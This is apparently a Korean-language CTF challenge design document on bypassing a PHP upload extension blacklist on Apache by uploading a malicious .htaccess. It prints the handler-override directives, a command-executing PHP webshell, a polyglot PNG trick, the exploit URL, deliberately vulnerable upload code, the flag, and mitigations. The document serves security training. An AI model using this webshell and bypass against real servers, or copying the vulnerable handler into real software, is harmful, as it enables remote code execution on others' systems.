---
title: Extension Blacklist Bypass via htaccess Upload — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, file-upload, htaccess, apache, rce, upload-bypass]
confidence: high
---

# Extension Blacklist Bypass via htaccess Upload — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Image Storage (보안 이미지 보관소)
- **난이도**: Medium-High
- **핵심 컨셉**: 파일 업로드 취약점에서 정교하게 정의된 확장자 제한을 무력화하는 **서버 환경설정 변조 공격** 문제입니다. 아파치(Apache) 서버 기반으로 구동되는 PHP 웹 애플리케이션은 사용자의 프로필 이미지를 받으며, 공격적인 PHP 파일 업로드를 제어하기 위해 블랙리스트 필터(예: `.php`, `.php3`, `.phtml`, `.phps` 등 차단)를 운영합니다. 그러나 아파치 서버가 개별 디렉터리 세팅 파일인 `.htaccess`의 업로드를 차단하지 않는 맹점을 파고들어, 특정 커스텀 확장자(`.png` 등)를 PHP 파일로 파싱하도록 지시하는 악성 `.htaccess` 설정을 주입한 뒤 이미지를 업로드해 원격 코드를 실행합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Upload Form**: 프로필 사진(PNG/JPG) 업로드를 유도하는 파일 선택 폼.
- **Backend Service (Apache + PHP)**:
  - 파일 업로드 핸들러 `upload.php` 구동.
  - 보안 로직: 파일 확장자가 `.php` 계열(정규식 매칭)인지 확인하여 거부.
  - 업로드된 파일은 그대로 웹 루트 하위 `/uploads/` 디렉터리에 원본 파일명으로 저장됨.
- **Flag 위치**:
  - 시스템 내부: `/flag.txt`

### 2.2 취약점 지점
1. **Weak Upload Extension Blacklist**:
   - 허용할 확장자만 골라내는 화이트리스트 검증 대신, 위험 확장자만 거르는 블랙리스트 검증을 적용하여 아파치의 환경설정 지시자 파일인 `.htaccess` 파일 업로드를 걸러내지 못합니다.
2. **Web-Accessible Executable Directory**:
   - 파일이 업로드되는 `/uploads/` 경로에서 스크립트 실행 권한이 활성화되어 있고, 아파치가 디렉터리 내 `.htaccess` 설정을 재정의하도록 허용(`AllowOverride All`) 설정되어 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 (Multipart/form-data) | 반환 값 | 비고 |
|---------------------|--------|------|------------------------------|---------|------|
| `/upload.php` | POST | 없음 | `file` 객체 | 업로드 경로 URL 또는 에러 | 설정 파일 주입 및 웹셸 업로드 타켓 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 업로드 확장자 차단 상태 진단
공격자는 일반적인 PHP 웹셸 업로드를 테스트하여 탐지 로직을 진단합니다.
- `shell.php` 전송 -> *응답*: "Error: PHP files are not allowed!"
- `shell.php5` 전송 -> *응답*: "Error: PHP files are not allowed!"
- 블랙리스트 필터가 `.php.*` 확장자군을 방어하고 있음을 파악합니다.

### Step 2. 악성 아파치 설정 파일 생성 및 업로드
아파치 웹 서버는 디렉터리 내에 `.htaccess` 파일이 발견되면 해당 폴더 내의 파일 해석 설정을 덮어씁니다. 공격자는 `.png` 확장자를 PHP 엔진이 구동시키도록 정의하는 파일을 만듭니다.
- **`.htaccess` 파일 내용**:
  ```apache
  # png 확장자 파일을 PHP 렌더러가 처리하도록 MIME 타입 매핑 수정
  AddType application/x-httpd-php .png
  ```
  또는:
  ```apache
  <FilesMatch "exploit.png">
    SetHandler application/x-httpd-php
  </FilesMatch>
  ```
- **업로드 진행**: 파일명을 그대로 `.htaccess`로 지정하여 POST 업로드합니다. 서버 필터는 `.php`가 아니므로 이를 성공적으로 수용하고 `/uploads/.htaccess`에 기록합니다.

### Step 3. PHP 코드를 내장한 이미지 웹셸 업로드
이제 `/uploads` 하위에 저장되는 png 파일은 PHP 엔진이 동작시키므로, PHP 실행문이 포함된 `exploit.png` 파일을 작성합니다.
- **`exploit.png` 내용**:
  ```php
  <?php
  // 웹셸 실행용 코드 기입
  if (isset($_GET['cmd'])) {
      system($_GET['cmd']);
  }
  ?>
  ```
  *(참고: 서버가 추가로 이미지 매직 바이트 검증을 거친다면, 파일 맨 앞에 PNG 헤더 바이트 `\x89PNG\r\n\x1a\n`을 덧붙인 Polyglot 형식으로 작성하여 통과시킵니다.)*
- **업로드 진행**: `exploit.png` 파일을 업로드하고 저장 주소인 `/uploads/exploit.png`를 획득합니다.

### Step 4. flag 획득
브라우저 또는 curl을 이용하여 생성된 경로에 명령 파라미터를 실어 접속합니다:
`http://storage.challenge.local/uploads/exploit.png?cmd=cat /flag.txt`
서버는 설정에 따라 `exploit.png` 내부의 PHP 쉘 코드를 가동시키고, `/flag.txt` 내용을 반환하며 플래그(`FLAG{htaccess_upload_allows_executable_override}`)를 얻습니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
// upload.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    
    // 취약점 지점: 블랙리스트 방식의 검증
    // php 확장자 정규 표현식으로 .php, .phtml 등만 차단
    // 아파치 제어 지시어 파일인 .htaccess에 대한 필터 누락
    if (preg_match('/\.ph(p[3-7]?|tml|s)$/i', $file_name)) {
        die("Error: PHP files are not allowed!");
    }
    
    $upload_dir = "uploads/";
    $target_file = $upload_dir . basename($file_name);
    
    if (move_uploaded_file($file_tmp, $target_file)) {
        echo "File successfully uploaded to: " . $target_file;
    } else {
        echo "Upload failed.";
    }
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **화이트리스트 기반 확장자 허용**:
   - 블랙리스트를 지양하고, 허가된 안전 확장자(예: `gif`, `png`, `jpg`, `jpeg`)만을 허용하도록 완전히 설계 구조를 바꿉니다.
   - **수정 예시**:
     ```php
     $allowed_extensions = ['png', 'jpg', 'jpeg', 'gif'];
     $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
     if (!in_array($ext, $allowed_extensions)) {
         die("Error: Only PNG, JPG, GIF are allowed!");
     }
     ```
2. **업로드 파일명 랜덤 난수화 및 경로 탈동기화**:
   - 사용자가 전송한 원본 파일명(`.htaccess` 등)을 그대로 저장하지 말고, 무작위 해시 문자열 등으로 강제 변환하여 설정 파일 매핑 적용 여지를 차단합니다. (예: `uuid4() + ".png"`)
3. **아파치 실행 권한 금지 설정 및 AllowOverride 제한**:
   - 아파치 서버 전역 환경 설정 파일(`httpd.conf` 또는 `apache2.conf`)에서 업로드 대상 폴더에 대해 `AllowOverride None`을 지정하여 하위 `.htaccess` 파일에 의해 MIME 컴파일 세팅이 덮어써 지는 것을 방지합니다.
   - 업로드 폴더에 대해 PHP 실행 비활성화 옵션을 강제 적용합니다.
     ```apache
     <Directory "/var/www/html/uploads">
         RemoveHandler .php .phtml .php3
         RemoveType .php .phtml .php3
         php_admin_value engine off
     </Directory>
     ```
